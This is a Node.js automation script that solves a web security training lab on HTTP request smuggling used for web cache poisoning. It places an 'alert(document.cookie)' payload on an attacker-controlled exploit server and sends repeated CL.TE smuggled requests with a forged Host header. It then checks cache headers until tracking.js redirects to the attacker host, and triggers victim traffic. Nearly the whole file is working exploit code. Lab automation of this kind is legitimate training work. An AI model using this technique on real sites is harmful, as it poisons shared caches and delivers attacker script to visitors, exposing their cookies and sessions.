const { URL } = require('url');

const { getExploitServerUrl, isSolved, runLab, waitForSolved } = require('./_common.cjs');
const { buildClTeSmuggleRequest, parseHeaders, sendRawTlsRequest, sleep, storeExploitFile } = require('./_smuggling.cjs');

const TITLE = 'Exploiting HTTP request smuggling to perform web cache poisoning';
const PATH = '/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning';

async function triggerVictimTraffic(page, labUrl, count = 5) {
  for (let index = 0; index < count; index += 1) {
    // eslint-disable-next-line no-await-in-loop
    await page.request.post(labUrl, { failOnStatusCode: false });
    // eslint-disable-next-line no-await-in-loop
    await sleep(300);
  }
}

async function fetchTracking(page, labUrl) {
  const response = await page.request.get(`${labUrl}/resources/js/tracking.js`, {
    failOnStatusCode: false,
    maxRedirects: 0,
  });
  return {
    status: response.status(),
    headers: response.headers(),
    body: await response.text(),
  };
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    if (await isSolved(page, labUrl)) {
      return;
    }

    const { host, hostname } = new URL(labUrl);
    const exploitUrl = await getExploitServerUrl(page, labUrl);
    const attackerHost = new URL(exploitUrl).host;

    await storeExploitFile(page, exploitUrl, '/post', 'alert(document.cookie)', 'text/javascript; charset=utf-8');

    for (const postId of [1, 3]) {
      const smuggledRequest = [
        `GET /post/next?postId=${postId} HTTP/1.1`,
        `Host: ${attackerHost}`,
        'Content-Type: application/x-www-form-urlencoded',
        'Content-Length: 10',
        '',
        'x=1',
      ].join('\r\n');
      const rawRequest = buildClTeSmuggleRequest(host, smuggledRequest);

      for (let attempt = 0; attempt < 12; attempt += 1) {
        // eslint-disable-next-line no-await-in-loop
        await sendRawTlsRequest(hostname, rawRequest);

        // eslint-disable-next-line no-await-in-loop
        const firstFetch = await fetchTracking(page, labUrl);
        const xCache = (firstFetch.headers['x-cache'] || '').toLowerCase();
        const age = Number.parseInt(firstFetch.headers.age || '0', 10) || 0;
        if (xCache && xCache !== 'miss') {
          // eslint-disable-next-line no-await-in-loop
          await sleep(Math.max(1000, (30 - age) * 1000));
          continue;
        }

        // eslint-disable-next-line no-await-in-loop
        const secondFetch = await fetchTracking(page, labUrl);
        const location = secondFetch.headers.location || '';
        if ((secondFetch.headers['x-cache'] || '').toLowerCase() === 'hit' || /exploit-server/i.test(location)) {
          // eslint-disable-next-line no-await-in-loop
          await triggerVictimTraffic(page, labUrl, 5);
          // eslint-disable-next-line no-await-in-loop
          if (await waitForSolved(page, labUrl, 25000, 3000)) {
            return;
          }
        }
      }
    }

    throw new Error('Cache poisoning did not solve the lab');
  },
});
